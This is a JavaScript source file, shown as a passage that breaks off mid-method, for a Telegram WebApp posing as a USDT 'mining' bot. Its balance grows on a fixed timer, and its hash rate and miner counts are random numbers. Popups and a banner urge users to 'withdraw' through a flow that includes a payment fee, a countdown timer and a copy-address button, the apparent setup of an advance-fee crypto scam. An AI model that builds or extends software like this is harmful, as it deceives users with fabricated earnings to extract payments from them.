
class TelegramMiningBot {
  constructor() {
    this.currentBalance = 0;
    this.isMining = false;
    this.miningInterval = null;
    this.activitiesInterval = null;
    this.messagesInterval = null;
    this.paymentCountdownInterval = null;
    this.miningStartTime = null;
    this.targetAmount = 230;
    this.earningsPerCycle = 8.5;
    this.cycleInterval = 60 * 1000;
    this.storageKey = 'usdt_mining_progress';
    this.autoSaveInterval = null;
    this.user = null;
    this.lastLoggedBalance = 0; // لتجنب تكرار رسائل الحفظ

    this.initializeTelegram();
  }

  initializeTelegram() {
    // التحقق من وجود Telegram WebApp API
    if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
      this.tg = window.Telegram.WebApp;
      
      try {
        this.tg.ready();
        
        // تطبيق ثيم Telegram
        this.applyTelegramTheme();
        
        // الحصول على بيانات المستخدم
        this.getUserData();
        
        // إعداد أزرار Telegram
        this.setupTelegramButtons();
        
        // إخفاء شاشة تسجيل الدخول وإظهار التطبيق
        setTimeout(() => {
          this.hideLoginScreen();
          this.initializeApp();
        }, 1500);
      } catch (error) {
        console.log('خطأ في تهيئة Telegram WebApp:', error);
        // الاستمرار مع البيانات الافتراضية
        setTimeout(() => {
          this.hideLoginScreen();
          this.initializeApp();
        }, 1500);
      }
    } else {
      // إذا لم يكن التطبيق يعمل في Telegram، تشغيل النسخة التجريبية
      console.log('تشغيل النسخة التجريبية - خارج Telegram');
      setTimeout(() => {
        this.hideLoginScreen();
        this.initializeApp();
      }, 1500);
    }
  }

  applyTelegramTheme() {
    if (this.tg && this.tg.themeParams) {
      const themeParams = this.tg.themeParams;
      // تطبيق ألوان Telegram على التطبيق
      document.documentElement.style.setProperty('--tg-bg-color', themeParams.bg_color || '#0a0a0a');
      document.documentElement.style.setProperty('--tg-text-color', themeParams.text_color || '#ffffff');
      document.documentElement.style.setProperty('--tg-hint-color', themeParams.hint_color || 'rgba(255, 255, 255, 0.7)');
      document.documentElement.style.setProperty('--tg-button-color', themeParams.button_color || '#00d4ff');
    }
  }

  getUserData() {
    const initData = this.tg.initDataUnsafe;
    if (initData && initData.user) {
      this.user = {
        id: initData.user.id,
        firstName: initData.user.first_name,
        lastName: initData.user.last_name || '',
        username: initData.user.username || '',
        photoUrl: initData.user.photo_url || null,
        languageCode: initData.user.language_code || 'ar'
      };
      
      // إضافة معرف المستخدم إلى مفتاح التخزين لجعله شخصياً
      this.storageKey = `usdt_mining_progress_${this.user.id}`;
    } else {
      // مستخدم تجريبي للاختبار
      this.user = {
        id: 'demo_user',
        firstName: 'مستخدم',
        lastName: 'تجريبي',
        username: 'demo',
        photoUrl: null,
        languageCode: 'ar'
      };
      this.storageKey = 'usdt_mining_progress_demo';
    }
  }

  setupTelegramButtons() {
    // إخفاء الزر الرئيسي في Telegram نهائياً
    if (this.tg && this.tg.MainButton) {
      try {
        this.tg.MainButton.hide();
      } catch (e) {
        console.log('خطأ في إخفاء MainButton:', e);
      }
    }

    // إخفاء زر الإعدادات أيضاً
    if (this.tg && this.tg.SettingsButton) {
      try {
        if (this.tg.SettingsButton.hide) {
          this.tg.SettingsButton.hide();
        }
      } catch (e) {
        console.log('SettingsButton غير مدعوم في هذا الإصدار');
      }
    }
  }

  hideLoginScreen() {
    const loginScreen = document.getElementById('loginScreen');
    const mainApp = document.getElementById('mainApp');
    
    if (loginScreen) loginScreen.style.display = 'none';
    if (mainApp) mainApp.style.display = 'block';
  }

  showError() {
    const loadingSpinner = document.getElementById('loadingSpinner');
    const errorMessage = document.getElementById('errorMessage');
    
    if (loadingSpinner) loadingSpinner.style.display = 'none';
    if (errorMessage) errorMessage.style.display = 'flex';
  }

  initializeApp() {
    this.loadProgress();
    this.initializeElements();
    this.setupEventListeners();
    this.displayUserInfo();
    this.initializeDisplays();
    this.startLiveUpdates();
    this.startAutoSave();
  }

  displayUserInfo() {
    const userName = document.getElementById('userName');
    const userAvatar = document.getElementById('userAvatar');
    
    if (userName && this.user) {
      const displayName = this.user.firstName + (this.user.lastName ? ' ' + this.user.lastName : '');
      userName.textContent = displayName;
    }
    
    if (userAvatar && this.user) {
      if (this.user.photoUrl) {
        userAvatar.innerHTML = `<img src="${this.user.photoUrl}" alt="صورة المستخدم">`;
      } else {
        // استخدام الحرف الأول من الاسم
        const initial = this.user.firstName ? this.user.firstName.charAt(0).toUpperCase() : '؟';
        userAvatar.innerHTML = initial;
      }
    }
  }

  

  showUserProfile() {
    if (this.user) {
      const userInfo = `المستخدم: ${this.user.firstName} ${this.user.lastName}\nالمعرف: @${this.user.username || 'غير محدد'}\nالرصيد: ${this.currentBalance.toFixed(2)} USDT\nحالة التعدين: ${this.isMining ? 'نشط' : 'متوقف'}`;
      
      if (this.tg) {
        if (this.tg.showPopup) {
          this.tg.showPopup({
            title: 'معلومات المستخدم',
            message: userInfo,
            buttons: [{type: 'ok'}]
          });
        } else if (this.tg.showAlert) {
          this.tg.showAlert(userInfo);
        } else {
          this.showNotification(userInfo, 'info');
        }
      } else {
        this.showNotification(userInfo, 'info');
      }
    }
  }

  showDailyLimitReached() {
    const message = `🎉 تهانينا! لقد وصلت إلى الحد الأقصى للتعدين اليومي\n\n` +
                   `💰 رصيدك الحالي: 250.00 USDT\n\n` +
                   `📈 لقد حققت أقصى استفادة من التعدين اليوم!\n\n` +
                   `🔄 لإعادة تنشيط التعدين والاستمرار في الربح:\n` +
                   `• اسحب أرباحك الحالية\n` +
                   `• ستتمكن من بدء دورة تعدين جديدة\n` +
                   `• واصل تحقيق المزيد من الأرباح!\n\n` +
                   `⚡ النظام مصمم لحمايتك وضمان استقرار الشبكة\n\n` +
                   `🎯 اسحب الآن واستمر في رحلة الربح معنا!`;

    this.sendTelegramNotification(message, 'success');
    
    // إضافة نشاط للوصول للحد الأقصى
    this.addActivity('🏆 تم الوصول للحد الأقصى للتعدين اليومي - 250 USDT', 0);
    
    // تعطيل أزرار التعدين
    if (this.startBtn) {
      this.startBtn.disabled = true;
      this.startBtn.innerHTML = '<i class="fas fa-trophy"></i> تم الوصول للحد الأقصى اليومي';
      this.startBtn.style.background = 'linear-gradient(45deg, #ffd700, #ffed4e)';
      this.startBtn.style.color = '#000';
    }
    
    // تحديث حالة التعدين
    if (this.miningStatus) {
      this.miningStatus.classList.remove('active');
      this.miningStatus.innerHTML = '<i class="fas fa-trophy"></i><span>مكتمل</span>';
      this.miningStatus.style.color = '#ffd700';
    }
    
    // إخفاء تفاصيل التعدين
    if (this.progressContainer) this.progressContainer.classList.remove('show');
    if (this.miningDetails) this.miningDetails.classList.remove('show');
    
    // إظهار رسالة تشجيعية للسحب
    this.showWithdrawEncouragement();
  }

  showWithdrawEncouragement() {
    // إنشاء بانر تشجيعي للسحب
    const existingBanner = document.querySelector('.withdraw-encouragement');
    if (existingBanner) existingBanner.remove();
    
    const banner = document.createElement('div');
    banner.className = 'withdraw-encouragement';
    banner.innerHTML = `
      <div class="encouragement-content">
        <div class="trophy-animation">
          <i class="fas fa-trophy"></i>
        </div>
        <h3>🎊 مبروك! أنت بطل اليوم!</h3>
        <p>لقد حققت أقصى ربح يومي ممكن</p>
        <div class="achievement-stats">
          <div class="stat">
            <span class="value">250</span>
            <span class="label">USDT محقق</span>
          </div>
          <div class="stat">
            <span class="value">100%</span>
            <span class="label">نسبة الإنجاز</span>
          </div>
        </div>
        <button class="withdraw-now-btn" onclick="document.getElementById('walletBtn').click()">
          <i class="fas fa-rocket"></i>
          اسحب أرباحك الآن
        </button>
        <div class="next-session-info">
          <i class="fas fa-info-circle"></i>
          <span>بعد السحب، ستتمكن من بدء جلسة تعدين جديدة</span>
        </div>
      </div>
    `;
    
    const mainContent = document.querySelector('.main-content');
    const balanceCard = document.querySelector('.balance-card');
    mainContent.insertBefore(banner, balanceCard.nextSibling);
  }

  sendTelegramNotification(message, type = 'info') {
    // إرسال إشعار عبر Telegram مع معالجة الأخطاء
    if (this.tg) {
      try {
        if (this.tg.showPopup) {
          this.tg.showPopup({
            title: 'إشعار',
            message: message,
            buttons: [{type: 'ok'}]
          });
        } else if (this.tg.showAlert) {
          this.tg.showAlert(message);
        } else {
          // إذا لم تكن الطرق مدعومة، استخدم الإشعار المحلي فقط
          this.showNotification(message, type);
        }
      } catch (error) {
        console.log('Telegram notification failed, using local notification');
        this.showNotification(message, type);
      }
    } else {
      // إضافة الإشعار المحلي
      this.showNotification(message, type);
    }
  }

  initializeElements() {
    // Main elements
    this.startBtn = document.getElementById('startBtn');
    this.stopBtn = document.getElementById('stopBtn');
    this.balance = document.getElementById('balance');
    this.walletBalance = document.getElementById('walletBalance');
    this.miningStatus = document.getElementById('miningStatus');
    this.activitiesList = document.getElementById('activitiesList');

    // Mining details elements
    this.miningDetails = document.getElementById('miningDetails');
    this.hashRateDisplay = document.getElementById('hashRate');
    this.difficultyDisplay = document.getElementById('difficulty');
    this.blocksCountDisplay = document.getElementById('blocksCount');
    this.transactionsDisplay = document.getElementById('transactions');
    this.networkStatusDisplay = document.getElementById('networkStatus');
    this.activeMinersDisplay = document.getElementById('activeMiners');

    // Messages elements
    this.messagesList = document.getElementById('messagesList');

    // Progress elements
    this.progressContainer = document.getElementById('progressContainer');
    this.progressFill = document.getElementById('progressFill');
    this.progressPercent = document.getElementById('progressPercent');

    // Wallet elements
    this.walletBtn = document.getElementById('walletBtn');
    this.withdrawModal = document.getElementById('withdrawModal');
    this.closeBtn = document.getElementById('closeBtn');
    this.withdrawAmount = document.getElementById('withdrawAmount');
    this.walletAddress = document.getElementById('walletAddress');
    this.confirmAddress = document.getElementById('confirmAddress');
    this.confirmBtn = document.getElementById('confirmBtn');
    this.feeInfo = document.getElementById('feeInfo');
    this.maxBtn = document.getElementById('maxBtn');

    // Payment elements
    this.paymentModal = document.getElementById('paymentModal');
    this.paymentAmount = document.getElementById('paymentAmount');
    this.paymentFee = document.getElementById('paymentFee');
    this.timer = document.getElementById('timer');
    this.copyBtn = document.getElementById('copyBtn');
    this.cancelBtn = document.getElementById('cancelBtn');
  }

  setupEventListeners() {
    if (this.startBtn) this.startBtn.addEventListener('click', () => this.startMining());
    if (this.stopBtn) this.stopBtn.addEventListener('click', () => this.stopMining());
    if (this.walletBtn) this.walletBtn.addEventListener('click', () => this.openWithdrawModal());
    if (this.closeBtn) this.closeBtn.addEventListener('click', () => this.closeWithdrawModal());
    if (this.confirmBtn) this.confirmBtn.addEventListener('click', () => this.processWithdrawal());
    if (this.cancelBtn) this.cancelBtn.addEventListener('click', () => this.closePaymentModal());
    if (this.copyBtn) this.copyBtn.addEventListener('click', () => this.copyAddress());
    if (this.maxBtn) this.maxBtn.addEventListener('click', () => this.setMaxAmount());

    // Form validation
    if (this.withdrawAmount) {
      this.withdrawAmount.addEventListener('input', () => {
        this.updateFeeDisplay();
        this.validateForm();
      });
    }
    if (this.walletAddress) this.walletAddress.addEventListener('input', () => this.validateForm());
    if (this.confirmAddress) this.confirmAddress.addEventListener('change', () => this.validateForm());

    // Close modals on outside click
    [this.withdrawModal, this.paymentModal].forEach(modal => {
      if (modal) {
        modal.addEventListener('click', (e) => {
          if (e.target === modal) {
            this.closeAllModals();
          }
        });
      }
    });

    // Escape key
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        this.closeAllModals();
      }
    });

    // حفظ عند إغلاق النافذة
    window.addEventListener('beforeunload', () => {
      this.forceSave();
    });

    // حفظ عند فقدان التركيز
    window.addEventListener('blur', () => {
      this.forceSave();
    });

    // حفظ عند إخفاء الصفحة
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        this.forceSave();
      }
    });
  }

  startMining() {
    if (this.currentBalance >= 250) {
      this.showDailyLimitReached();
      return;
    }
    
    if (this.currentBalance >= this.targetAmount) {
      this.sendTelegramNotification('لقد وصلت إلى الحد الأقصى! يرجى سحب أموالك أولاً.', 'warning');
      return;
    }

    this.isMining = true;
    this.miningStartTime = Date.now();
    
    // حفظ فوري عند بدء التعدين
    this.forceSave();
    
    if (this.startBtn) this.startBtn.disabled = true;
    if (this.stopBtn) this.stopBtn.disabled = false;

    if (this.miningStatus) {
      this.miningStatus.classList.add('active');
      this.miningStatus.innerHTML = '<i class="fas fa-circle"></i><span>يعمل</span>';
    }
    if (this.progressContainer) this.progressContainer.classList.add('show');
    if (this.miningDetails) this.miningDetails.classList.add('show');
    
    // إظهار مؤشرات التعدين
    const balanceCard = document.querySelector('.balance-card');
    const miningEarningsInfo = document.getElementById('miningEarningsInfo');
    if (balanceCard) balanceCard.classList.add('mining-active');
    if (miningEarningsInfo) miningEarningsInfo.style.display = 'block';

    this.miningInterval = setInterval(() => {
      this.updateMiningProgress();
    }, 1000);

    this.addActivity('🚀 بدء التعدين بنجاح', 0);
    
    // إرسال إشعار تحفيزي (فقط إذا كان مدعوماً)
    if (this.tg && this.tg.HapticFeedback) {
      try {
        if (this.tg.HapticFeedback.impactOccurred) {
          this.tg.HapticFeedback.impactOccurred('medium');
        }
      } catch (e) {
        console.log('HapticFeedback غير مدعوم في هذا الإصدار');
      }
    }
  }

  stopMining() {
    console.log('⏹️ بدء عملية إيقاف التعدين...');
    
    // حساب الأرباح النهائية قبل التوقف
    if (this.miningStartTime && this.isMining) {
      const elapsedTime = Date.now() - this.miningStartTime;
      const completedCycles = Math.floor(elapsedTime / this.cycleInterval);
      const finalBalance = Math.min(completedCycles * this.earningsPerCycle, 250);
      
      if (finalBalance > this.currentBalance) {
        console.log(`💰 تحديث الرصيد النهائي قبل الإيقاف: من ${this.currentBalance.toFixed(2)} إلى ${finalBalance.toFixed(2)} USDT`);
        this.currentBalance = finalBalance;
      }
    }
    
    // حفظ فوري متعدد قبل الإيقاف
    this.forceSave();
    
    this.isMining = false;
    this.miningStartTime = null; // إعادة تعيين وقت البداية
    
    if (this.startBtn) this.startBtn.disabled = false;
    if (this.stopBtn) this.stopBtn.disabled = true;

    if (this.miningStatus) {
      this.miningStatus.classList.remove('active');
      this.miningStatus.innerHTML = '<i class="fas fa-circle"></i><span>متوقف</span>';
    }
    if (this.progressContainer) this.progressContainer.classList.remove('show');
    if (this.miningDetails) this.miningDetails.classList.remove('show');
    
    // إخفاء مؤشرات التعدين
    const balanceCard = document.querySelector('.balance-card');
    const miningEarningsInfo = document.getElementById('miningEarningsInfo');
    if (balanceCard) balanceCard.classList.remove('mining-active');
    if (miningEarningsInfo) miningEarningsInfo.style.display = 'none';

    // إيقاف جميع الفترات الزمنية
    if (this.miningInterval) {
      clearInterval(this.miningInterval);
      this.miningInterval = null;
    }
    
    if (this.miningWatchdog) {
      clearInterval(this.miningWatchdog);
      this.miningWatchdog = null;
    }

    // تحديث العرض
    this.updateDisplays();

    // حفظ متعدد مع تأخيرات مختلفة لضمان النجاح
    const savePromises = [
      this.forceSave(),
      new Promise(resolve => setTimeout(() => { this.forceSave(); resolve(); }, 500)),
      new Promise(resolve => setTimeout(() => { this.forceSave(); resolve(); }, 1000)),
      new Promise(resolve => setTimeout(() => { this.forceSave(); resolve(); }, 2000))
    ];
    
    Promise.all(savePromises).then(() => {
      console.log('💾 تم إكمال جميع عمليات الحفظ');
    });

    this.addActivity(`⏹️ تم إيقاف التعدين - الرصيد المحفوظ: ${this.currentBalance.toFixed(2)} USDT`, 0);
    
    console.log(`✅ تم إيقاف التعدين بنجاح. الرصيد النهائي: ${this.currentBalance.toFixed(2)} USDT`);
  }

  updateMiningProgress() {
    if (!this.isMining || !this.miningStartTime) {
      console.log('⚠️ التعدين متوقف أو لا يوجد وقت بداية');
      return;
    }

    const currentTime = Date.now();
    const elapsedTime = currentTime - this.miningStartTime;
    const completedCycles = Math.floor(elapsedTime / this.cycleInterval);
    const currentCycleProgress = (elapsedTime % this.cycleInterval) / this.cycleInterval;
    
    // حساب الأرباح: 8.5 USDT لكل دقيقة مكتملة
    const calculatedBalance = Math.min(completedCycles * this.earningsPerCycle, 250);
    
    console.log(`⏱️ تحديث التعدين: الوقت المنقضي=${Math.floor(elapsedTime/1000)}s, الدورات=${completedCycles}, الرصيد المحسوب=${calculatedBalance.toFixed(2)}`);
    
    // التحقق من الوصول للحد الأقصى اليومي (250 USDT)
    if (calculatedBalance >= 250) {
      console.log('🏆 تم الوصول للحد الأقصى 250 USDT');
      this.currentBalance = 250;
      this.stopMining();
      this.showDailyLimitReached();
      return;
    }
    
    // تحديث الرصيد - دائماً نأخذ أكبر قيمة لتجنب التراجع
    const newBalance = Math.max(this.currentBalance, calculatedBalance);
    const balanceChanged = newBalance !== this.currentBalance;
    
    if (balanceChanged) {
      const previousBalance = this.currentBalance;
      this.currentBalance = newBalance;
      
      console.log(`💰 تحديث الرصيد: من ${previousBalance.toFixed(2)} إلى ${this.currentBalance.toFixed(2)} USDT`);
      
      // إضافة نشاط عند اكتمال دورة جديدة
      if (completedCycles > 0 && Math.floor(previousBalance / this.earningsPerCycle) < completedCycles) {
        this.addActivity(`💰 تم تعدين ${this.earningsPerCycle} USDT - الدورة ${completedCycles}`, this.earningsPerCycle);
        this.sendTelegramNotification(`تم تعدين ${this.earningsPerCycle} USDT! الدورة ${completedCycles}`, 'success');
        
        // تحفيز بصري (فقط إذا كان مدعوماً)
        if (this.tg && this.tg.HapticFeedback) {
          try {
            if (this.tg.HapticFeedback.notificationOccurred) {
              this.tg.HapticFeedback.notificationOccurred('success');
            }
          } catch (e) {
            console.log('HapticFeedback غير مدعوم في هذا الإصدار');
          }
        }
      }
      
      // حفظ فوري عند تغيير الرصيد
      this.forceSave();
    }
    
    // حفظ دوري كل 10 ثوان للتأكد
    const secondsElapsed = Math.floor(elapsedTime / 1000);
    if (secondsElapsed % 10 === 0) {
      console.log('🔄 حفظ دوري للتقدم');
      this.forceSave();
    }
    
    // التحقق من صحة حالة التعدين
    if (!this.isMining) {
      console.log('⚠️ حالة التعدين تغيرت إلى متوقف - إيقاف التحديث');
      return;
    }
    
    // تحديث العرض
    this.updateDisplays();
    this.updateMiningVisuals(currentCycleProgress, completedCycles);
    this.updateMiningDetails(currentCycleProgress);
  }

  updateDisplays() {
    if (this.balance) this.balance.textContent = this.currentBalance.toFixed(2);
    if (this.walletBalance) this.walletBalance.textContent = this.currentBalance.toFixed(2);
    
    // تحديث النسبة المئوية في أعلى الصفحة
    const progressPercent = document.getElementById('progressPercent');
    if (progressPercent && this.isMining && this.miningStartTime) {
      const elapsedTime = Date.now() - this.miningStartTime;
      const currentCycleProgress = (elapsedTime % this.cycleInterval) / this.cycleInterval;
      progressPercent.textContent = `${Math.floor(currentCycleProgress * 100)}%`;
    }
  }

  initializeDisplays() {
    this.updateDisplays();
    
    if (this.isMining) {
      const miningEarningsInfo = document.getElementById('miningEarningsInfo');
      if (miningEarningsInfo) {
        miningEarningsInfo.style.display = 'block';
      }
    }
  }

  updateMiningVisuals(cycleProgress, completedCycles) {
    if (this.progressFill) this.progressFill.style.width = `${cycleProgress * 100}%`;
    if (this.progressPercent) this.progressPercent.textContent = `${Math.floor(cycleProgress * 100)}%`;
    
    const cyclesInfo = document.getElementById('completedCycles');
    if (cyclesInfo) {
      cyclesInfo.textContent = completedCycles;
    }
    
    const remainingTime = this.cycleInterval - ((Date.now() - this.miningStartTime) % this.cycleInterval);
    const minutes = Math.floor(remainingTime / (1000 * 60));
    const seconds = Math.floor((remainingTime % (1000 * 60)) / 1000);
    
    const nextEarningTimes = document.querySelectorAll('#nextEarningTime');
    nextEarningTimes.forEach(element => {
      if (element) {
        element.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      }
    });
  }

  updateMiningDetails(progress) {
    if (!this.isMining) return;

    const baseHashRate = 150 + Math.random() * 300;
    const currentHashRate = Math.floor(baseHashRate * (0.8 + progress * 0.4));
    if (this.hashRateDisplay) this.hashRateDisplay.textContent = `${currentHashRate} H/s`;

    const blocksCount = Math.floor(progress * 12);
    if (this.blocksCountDisplay) this.blocksCountDisplay.textContent = blocksCount.toString();

    const tps = Math.floor(5 + Math.random() * 15);
    if (this.transactionsDisplay) this.transactionsDisplay.textContent = `${tps} TPS`;

    const baseMiners = 2847;
    const variation = Math.floor(Math.random() * 100 - 50);
    if (this.activeMinersDisplay) this.activeMinersDisplay.textContent = (baseMiners + variation).toLocaleString();
  }

  loadProgress() {
    console.log('🔄 بدء تحميل البيانات المحفوظة...');
    
    let loadedData = null;
    
    // محاولة التحميل من مصادر متعددة
    const sources = [
      () => localStorage.getItem(this.storageKey),
      () => sessionStorage.getItem(this.storageKey + '_backup'),
      () => window.miningBackup ? JSON.stringify(window.miningBackup) : null,
      () => this.loadFromCookies(),
      () => this.loadFromIndexedDB()
    ];
    
    for (let i = 0; i < sources.length; i++) {
      try {
        const source = sources[i]();
        if (source instanceof Promise) {
          // للمصادر غير المتزامنة مثل IndexedDB
          source.then(data => {
            if (data && !loadedData) {
              this.processLoadedData(data);
            }
          });
          continue;
        }
        
        if (source) {
          loadedData = JSON.parse(source);
          console.log(`✅ تم تحميل البيانات من المصدر ${i + 1}`);
          break;
        }
      } catch (error) {
        console.log(`❌ فشل تحميل المصدر ${i + 1}:`, error);
      }
    }
    
    if (loadedData) {
      this.processLoadedData(loadedData);
    } else {
      console.log('⚠️ لم يتم العثور على بيانات محفوظة، بدء جديد');
      this.currentBalance = 0;
      this.isMining = false;
      this.miningStartTime = null;
    }
  }

  // معالجة البيانات المحملة
  processLoadedData(data) {
    console.log('📊 معالجة البيانات المحملة:', data);
    
    this.currentBalance = Math.max(data.balance || 0, 0);
    
    if (data.miningStartTime && data.isMining) {
      const timeSinceLastSave = Date.now() - (data.lastSaved || data.miningStartTime);
      const maxOfflineTime = 15 * 60 * 1000; // 15 دقيقة
      
      if (timeSinceLastSave < maxOfflineTime) {
        console.log('🔄 استكمال التعدين المتوقف');
        this.miningStartTime = data.miningStartTime;
        this.isMining = true;
        
        // حساب الأرباح المفقودة أثناء عدم الاتصال
        const elapsedTime = Date.now() - this.miningStartTime;
        const completedCycles = Math.floor(elapsedTime / this.cycleInterval);
        const calculatedBalance = Math.min(completedCycles * this.earningsPerCycle, 250);
        
        // تحديث الرصيد بأكبر قيمة
        this.currentBalance = Math.max(data.balance || 0, calculatedBalance);
        
        // التحقق من الوصول للحد الأقصى
        if (this.currentBalance >= 250) {
          this.currentBalance = 250;
          this.isMining = false;
          this.miningStartTime = null;
          console.log('🏆 تم الوصول للحد الأقصى أثناء عدم الاتصال');
        } else {
          setTimeout(() => {
            if (this.isMining) {
              this.resumeMining();
            }
          }, 1000);
        }
      } else {
        console.log('⏰ انتهت صلاحية جلسة التعدين');
        this.isMining = false;
        this.miningStartTime = null;
      }
    } else {
      this.isMining = false;
      this.miningStartTime = null;
    }
    
    // حفظ فوري للتأكد من سلامة البيانات
    setTimeout(() => {
      this.forceSave();
    }, 1000);
  }

  // تحميل من الكوكيز
  loadFromCookies() {
    try {
      const cookieName = `mining_backup_${this.user ? this.user.id : 'demo'}=`;
      const cookies = document.cookie.split(';');
      
      for (let cookie of cookies) {
        cookie = cookie.trim();
        if (cookie.indexOf(cookieName) === 0) {
          const cookieValue = cookie.substring(cookieName.length);
          return decodeURIComponent(cookieValue);
        }
      }
      
      return null;
    } catch (error) {
      console.log('خطأ في تحميل الكوكيز:', error);
      return null;
    }
  }

  // تحميل من IndexedDB
  loadFromIndexedDB() {
    return new Promise((resolve) => {
      if (!window.indexedDB) {
        resolve(null);
        return;
      }
      
      try {
        const request = indexedDB.open('MiningDatabase', 1);
        
        request.onerror = () => {
          resolve(null);
        };
        
        request.onsuccess = (event) => {
          const db = event.target.result;
          
          if (!db.objectStoreNames.contains('mining_progress')) {
            resolve(null);
            return;
          }
          
          const transaction = db.transaction(['mining_progress'], 'readonly');
          const store = transaction.objectStore('mining_progress');
          const getRequest = store.get(this.user ? this.user.id : 'demo');
          
          getRequest.onsuccess = () => {
            const result = getRequest.result;
            if (result) {
              resolve(result);
            } else {
              resolve(null);
            }
          };
          
          getRequest.onerror = () => {
            resolve(null);
          };
        };
      } catch (error) {
        resolve(null);
      }
    });
  }

  forceSave() {
    const progressData = {
      balance: this.currentBalance,
      miningStartTime: this.miningStartTime,
      isMining: this.isMining,
      lastSaved: Date.now(),
      userId: this.user ? this.user.id : 'unknown',
      sessionId: Date.now().toString(),
      version: '2.1'
    };

    let saveSuccess = false;

    try {
      // محاولة الحفظ في localStorage
      localStorage.setItem(this.storageKey, JSON.stringify(progressData));
      saveSuccess = true;
    } catch (error) {
      console.log('فشل حفظ localStorage:', error);
    }

    try {
      // حفظ احتياطي في sessionStorage
      sessionStorage.setItem(this.storageKey + '_backup', JSON.stringify(progressData));
      saveSuccess = true;
    } catch (error) {
      console.log('فشل حفظ sessionStorage:', error);
    }

    try {
      // حفظ في الذاكرة العامة
      window.miningBackup = progressData;
      saveSuccess = true;
    } catch (error) {
      console.log('فشل حفظ window:', error);
    }

    try {
      // حفظ في الكوكيز كخيار أخير
      const compressedData = JSON.stringify({
        balance: this.currentBalance,
        miningStartTime: this.miningStartTime,
        isMining: this.isMining,
        lastSaved: Date.now(),
        userId: this.user ? this.user.id : 'demo'
      });
      document.cookie = `mining_backup_${this.user ? this.user.id : 'demo'}=${encodeURIComponent(compressedData)}; max-age=604800; path=/; SameSite=Lax`;
      saveSuccess = true;
    } catch (error) {
      console.log('فشل حفظ الكوكيز:', error);
    }

    // حفظ في IndexedDB للاعتمادية العالية
    try {
      this.saveToIndexedDB(progressData);
      saveSuccess = true;
    } catch (error) {
      console.log('فشل حفظ IndexedDB:', error);
    }

    if (saveSuccess && this.currentBalance !== this.lastLoggedBalance) {
      console.log(`✅ تم حفظ التقدم بنجاح: ${this.currentBalance.toFixed(2)} USDT`);
      this.lastLoggedBalance = this.currentBalance;
    } else if (!saveSuccess) {
      console.log('❌ فشل في جميع طرق الحفظ!');
    }

    return saveSuccess;
  }

  // حفظ في IndexedDB للاعتمادية
  saveToIndexedDB(data) {
    if (!window.indexedDB) return;
    
    try {
      const request = indexedDB.open('MiningDatabase', 1);
      
      request.onerror = () => {
        console.log('خطأ في فتح IndexedDB');
      };
      
      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains('mining_progress')) {
          db.createObjectStore('mining_progress', { keyPath: 'userId' });
        }
      };
      
      request.onsuccess = (event) => {
        const db = event.target.result;
        const transaction = db.transaction(['mining_progress'], 'readwrite');
        const store = transaction.objectStore('mining_progress');
        
        const saveData = {
          userId: this.user ? this.user.id : 'demo',
          ...data
        };
        
        store.put(saveData);
        
        transaction.oncomplete = () => {
          console.log('تم الحفظ في IndexedDB بنجاح');
        };
      };
    } catch (error) {
      console.log('خطأ في IndexedDB:', error);
    }
  }

  startAutoSave() {
    // حفظ تلقائي كل 3 ثوان أثناء التعدين
    this.autoSaveInterval = setInterval(() => {
      if (this.isMining || this.currentBalance > 0) {
        this.forceSave();
      }
    }, 3000);
    
    // حفظ عند تغيير الرصيد
    let lastBalance = this.currentBalance;
    const balanceChecker = setInterval(() => {
      if (this.currentBalance !== lastBalance) {
        console.log(`💾 تغيير الرصيد: من ${lastBalance.toFixed(2)} إلى ${this.currentBalance.toFixed(2)} USDT`);
        this.forceSave();
        lastBalance = this.currentBalance;
      }
    }, 1000);
    
    // مراقب حالة التعدين لمنع التوقف غير المبرر
    this.miningWatchdog = setInterval(() => {
      if (this.isMining && this.miningStartTime) {
        const elapsedTime = Date.now() - this.miningStartTime;
        const expectedCycles = Math.floor(elapsedTime / this.cycleInterval);
        const expectedBalance = Math.min(expectedCycles * this.earningsPerCycle, 250);
        
        // التحقق من تطابق الرصيد مع التوقعات
        if (expectedBalance > this.currentBalance + 0.1) {
          console.log(`⚠️ اكتشاف تباين في التعدين. متوقع: ${expectedBalance.toFixed(2)}, حالي: ${this.currentBalance.toFixed(2)}`);
          console.log('🔧 تصحيح الرصيد...');
          this.currentBalance = expectedBalance;
          this.updateDisplays();
          this.forceSave();
        }
        
        // التحقق من وجود الـ interval
        if (!this.miningInterval) {
          console.log('⚠️ اكتشاف توقف التعدين - إعادة تشغيل');
          this.miningInterval = setInterval(() => {
            this.updateMiningProgress();
          }, 1000);
        }
      }
    }, 5000);
    
    // حفظ فوري عند الأحداث المهمة
    this.setupEmergencySave();
  }

  setupEmergencySave() {
    // حفظ عند إغلاق النافذة/التبويب
    window.addEventListener('beforeunload', (e) => {
      console.log('💾 حفظ طارئ قبل الإغلاق');
      this.forceSave();
      
      // إضافة تأخير قصير للتأكد من اكتمال الحفظ
      const start = Date.now();
      while (Date.now() - start < 100) {
        // انتظار 100ms
      }
    });

    // حفظ عند فقدان التركيز
    window.addEventListener('blur', () => {
      console.log('💾 حفظ عند فقدان التركيز');
      this.forceSave();
    });

    // حفظ عند إخفاء الصفحة
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        console.log('💾 حفظ عند إخفاء الصفحة');
        this.forceSave();
      } else {
        console.log('👁️ عودة للصفحة - التحقق من البيانات');
        // إعادة تحميل البيانات عند العودة للصفحة
        setTimeout(() => {
          this.loadProgress();
          this.updateDisplays();
        }, 500);
      }
    });

    // حفظ عند تغيير حالة الاتصال
    window.addEventListener('online', () => {
      console.log('🌐 عاد الاتصال - حفظ البيانات');
      this.forceSave();
    });

    window.addEventListener('offline', () => {
      console.log('📵 انقطع الاتصال - حفظ محلي');
      this.forceSave();
    });

    // حفظ دوري كل دقيقة كضمان إضافي
    setInterval(() => {
      if (this.currentBalance > 0) {
        console.log('🔄 حفظ دوري');
        this.forceSave();
      }
    }, 60000);
  }

  resumeMining() {
    console.log('🔄 بدء استكمال التعدين...');
    
    // التحقق من صحة البيانات
    if (!this.miningStartTime || this.currentBalance >= 250) {
      console.log('❌ لا يمكن استكمال التعدين - بيانات غير صحيحة');
      this.isMining = false;
      return;
    }
    
    // حساب الرصيد الحالي بناءً على الوقت المنقضي
